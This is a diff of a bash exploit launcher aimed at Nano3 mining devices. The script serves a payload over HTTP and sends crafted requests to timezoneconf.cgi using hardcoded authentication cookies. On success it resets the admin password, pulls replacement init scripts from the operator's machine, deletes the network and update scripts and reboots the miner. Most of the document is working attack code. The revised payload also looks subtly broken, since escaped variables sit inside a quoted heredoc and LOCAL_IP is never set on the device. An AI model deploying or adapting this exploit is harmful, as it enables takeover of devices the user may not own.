@@ -1,25 +1,27 @@
 #!/bin/bash
-#############################################################
+######################################################################
 # Nano3 Deployment / Exploit Launcher (for controlled testing)
 #
 # Description:
-# - Builds a small payload ("rootnano") and serves it from a local
-#   HTTP server on the host.
-# - Attempts to trigger the payload on a target Nano3 device by
-#   sending specially-crafted POST requests to timezoneconf.cgi using
-#   a list of known authentication cookies.
-# - If successful, the payload on the miner will change the admin
-#   password, create an SSH host key, replace init scripts
-#   (/etc/init.d/rcS, S50nanowatch, S99btcminer) with files served
-#   from the host, remove some config files and reboot the miner.
+#   - Builds a small payload ("rootnano") and serves it from a
+#     local HTTP server on the host.
+#   - Attempts to trigger the payload on a target Nano3 device by
+#     sending specially‑crafted POST requests to timezoneconf.cgi
+#     using a list of known authentication cookies.
+#   - If successful, the payload on the miner will:
+#       * change the admin password,
+#       * generate an SSH host key,
+#       * overwrite /etc/init.d/rcS, S50nanowatch and S99btcminer
+#         with files served from the host,
+#       * delete /etc/init.d/S40network and /etc/init.d/S80swupdate,
+#       * remove two configuration files and reboot the miner.
 #
-# Note: This script performs privileged actions on the target device.
+# NOTE: This script performs privileged actions on the target device.
 # Use only in authorized, controlled environments and with explicit
 # permission. Review and approve any files in tools/ before serving.
-#############################################################
+######################################################################
 
-
-# Path to the rcS file
+# Path to rcS file
 RCS_FILE="./tools/rcS"
 
 # Read values from rcS
@@ -28,27 +30,25 @@ wifiname=$(grep '^wifiname=' "$RCS_FILE" | cut -d'"' -f2)
 wifipass=$(grep '^wifipass=' "$RCS_FILE" | cut -d'"' -f2)
 btc_address=$(grep '^btc_address=' "$RCS_FILE" | cut -d'"' -f2)
 
-
-# ========================
+# --------------------------------------------
 # Configuration
-# ========================
+# --------------------------------------------
 SERVER_PORT=8080
-LOCAL_IP=$(hostname -I | awk '{print $1}')  # local IP of your PC
-BASE_DIR="$(dirname "$0")"                  # directory where this script is located
+LOCAL_IP=$(hostname -I | awk '{print $1}')        # local IP of your PC
+BASE_DIR="$(dirname "$0")"                         # directory where this script resides
 TOOLS_DIR="$BASE_DIR/tools"
 SCRIPT_PATH="$TOOLS_DIR/rootnano"
 DEST_DIR="/etc/init.d"
-# ========================
-# Verify tools folder and required files
-# ========================
 
-# Check if any field is empty
+# --------------------------------------------
+# Basic validations
+# --------------------------------------------
 if [[ -z "$nano3_pool" || -z "$wifiname" || -z "$wifipass" || -z "$btc_address" ]]; then
-    echo "Error: rcS contains empty fields. Please fill in nano3_pool, wifiname, wifipass, and btc_address before proceeding."
+    echo "Error: rcS contains empty fields. Please fill nano3_pool, wifiname, wifipass and btc_address before proceeding."
     exit 1
 fi
 
-echo "All fields are filled. Continuing with installation..."
+echo "All fields are filled. Continuing..."
 
 if [ ! -d "$TOOLS_DIR" ]; then
     echo "ERROR: the directory $TOOLS_DIR does not exist"
@@ -56,29 +56,26 @@ if [ ! -d "$TOOLS_DIR" ]; then
     exit 1
 fi
 
-if [ ! -f "$TOOLS_DIR/rcS" ]; then
-    echo "ERROR: $TOOLS_DIR/rcS not found"
-    exit 1
-fi
+for f in rcS S99btcminer; do
+    if [ ! -f "$TOOLS_DIR/$f" ]; then
+        echo "ERROR: $TOOLS_DIR/$f not found"
+        exit 1
+    fi
+done
 
-if [ ! -f "$TOOLS_DIR/S99btcminer" ]; then
-    echo "ERROR: $TOOLS_DIR/S99btcminer not found"
-    exit 1
-fi
+echo "rcS and S99btcminer detected in $TOOLS_DIR"
 
-echo "Detected rcS and S99btcminer in $TOOLS_DIR"
-
-# ========================
+# --------------------------------------------
 # Ask for the Nano3 device IP
-# ========================
+# --------------------------------------------
 while [[ -z "$NANO3_IP" ]]; do
     read -p "Enter the Nano3 device IP: " NANO3_IP
 done
 
-# ========================
-# rootnano payload running on the miner
-# ========================
-cat << EOF > "$SCRIPT_PATH"
+# --------------------------------------------
+# rootnano payload that will run on the miner
+# --------------------------------------------
+cat << 'EOF' > "$SCRIPT_PATH"
 #!/bin/sh
 
 LOG_FILE="/opt/pwned.log"
@@ -87,43 +84,60 @@ log() {
     echo "[\$(date '+%Y-%m-%d %H:%M:%S')] \$1" >> "\$LOG_FILE"
 }
 
-log "=== rootnano started from $LOCAL_IP ==="
+log "=== rootnano started from \$LOCAL_IP ==="
 
-# Set admin password to "admin"
+# Change admin password to "admin"
 echo -ne "admin\nadmin\n" | passwd admin >/dev/null 2>&1
 log "Admin password changed to 'admin'."
 
-# Generate ED25119 SSH key
+# Generate ED25519 SSH host key
 yes | ssh-keygen -t ed25519 -f /etc/ssh/ssh_host_ed25519_key -N '' >/dev/null 2>&1
 log "Hostkey SSH ed25519 generated."
 
-# --------- COPY TOOLS FILES ---------
-#DEST_DIR="/etc/init.d"
+# ------------------------------------------------
+# Download and overwrite custom init scripts
+# ------------------------------------------------
+DEST_DIR="/etc/init.d"
 
-# Download and overwrite custom rcS
-if wget -q http://$LOCAL_IP:$SERVER_PORT/tools/rcS -O "$DEST_DIR/rcS"; then
-    chmod +x "$DEST_DIR/rcS"
-    log "rcS installed from tools (no backup)."
+# rcS
+if wget -q http://\$LOCAL_IP:\$SERVER_PORT/tools/rcS -O "\$DEST_DIR/rcS"; then
+    chmod +x "\$DEST_DIR/rcS"
+    log "rcS installed from tools."
 else
     log "ERROR: Could not download rcS."
 fi
 
-# Download and overwrite custom S50nanowatch
-if wget -q http://$LOCAL_IP:$SERVER_PORT/tools/S50nanowatch -O "$DEST_DIR/S50nanowatch"; then
-    chmod +x "$DEST_DIR/S50nanowatch"
-    log "nanowatch installed from tools."
+# S50nanowatch
+if wget -q http://\$LOCAL_IP:\$SERVER_PORT/tools/S50nanowatch -O "\$DEST_DIR/S50nanowatch"; then
+    chmod +x "\$DEST_DIR/S50nanowatch"
+    log "S50nanowatch installed from tools."
 else
-    log "ERROR: Could not download nanowatch."
+    log "ERROR: Could not download S50nanowatch."
 fi
 
-# Download and copy S99btcminer
-if wget -q http://$LOCAL_IP:$SERVER_PORT/tools/S99btcminer -O "$DEST_DIR/S99btcminer"; then
-    chmod +x "$DEST_DIR/S99btcminer"
+# S99btcminer
+if wget -q http://\$LOCAL_IP:\$SERVER_PORT/tools/S99btcminer -O "\$DEST_DIR/S99btcminer"; then
+    chmod +x "\$DEST_DIR/S99btcminer"
     log "S99btcminer installed from tools."
 else
     log "ERROR: S99btcminer could not be downloaded."
 fi
-log "Restarting the miner..."
+
+# ------------------------------------------------
+# Delete unwanted init scripts
+# ------------------------------------------------
+for f in S40network S80swupdate; do
+    if rm -f "\$DEST_DIR/\$f"; then
+        log "Deleted \$f."
+    else
+        log "ERROR: Could not delete \$f (possibly it did not exist)."
+    fi
+done
+
+# ------------------------------------------------
+# Final actions
+# ------------------------------------------------
+log "Rebooting the miner..."
 rm /data/usrcon/cgminer.ini
 rm /data/usrcon/systemcfg.ini
 sync
@@ -132,22 +146,22 @@ EOF
 
 chmod +x "$SCRIPT_PATH"
 
-# ========================
+# --------------------------------------------
 # Start HTTP server to serve rootnano and tools/
-# ========================
+# --------------------------------------------
 cd "$BASE_DIR"
 echo "Starting server at http://$LOCAL_IP:$SERVER_PORT/"
-python3 -m http.server $SERVER_PORT >/dev/null 2>&1 &
+python3 -m http.server "$SERVER_PORT" >/dev/null 2>&1 &
 SERVER_PID=$!
 
-sleep 2  # give the server a moment to start
+sleep 2   # give the server a moment to start
 
-# ========================
-# Attempt exploit with possible auth keys
-# ========================
+# --------------------------------------------
+# Attempt exploit with possible authentication keys
+# --------------------------------------------
 AUTH_KEYS=(
-  "ff0000ff4813494d137e1631bba301d5"  # default one
-  "ff0000ffe489f84c23a6fbd9017f631a"  # alternative auth key
+  "ff0000ff4813494d137e1631bba301d5"   # default key
+  "ff0000ffe489f84c23a6fbd9017f631a"   # alternative key
 )
 
 SUCCESS=0
@@ -167,14 +181,22 @@ for AUTH in "${AUTH_KEYS[@]}"; do
     fi
 done
 
-# ========================
+# --------------------------------------------
 # Stop HTTP server
-# ========================
-kill $SERVER_PID 2>/dev/null || true
+# --------------------------------------------
+kill "$SERVER_PID" 2>/dev/null || true
 echo "Server stopped."
 
+# --------------------------------------------
+# Final actions – ask the operator what to do next
+# --------------------------------------------
 if [ $SUCCESS -eq 1 ]; then
-    echo "The miner should reboot in a few seconds..."
+    read -p "Do you want the miner to reboot (r) or power‑off (p)? [r/p]: " choice
+    case "$choice" in
+        [Rr]* ) echo "You chose to reboot the miner. (The payload already triggers a reboot.)" ;;
+        [Pp]* ) echo "You chose to power‑off the miner. (The payload will need to be modified if you want to power off.)" ;;
+        * ) echo "No valid choice made. The miner will reboot by default." ;;
+    esac
 else
     echo "None of the auth keys worked, check manually."
 fi
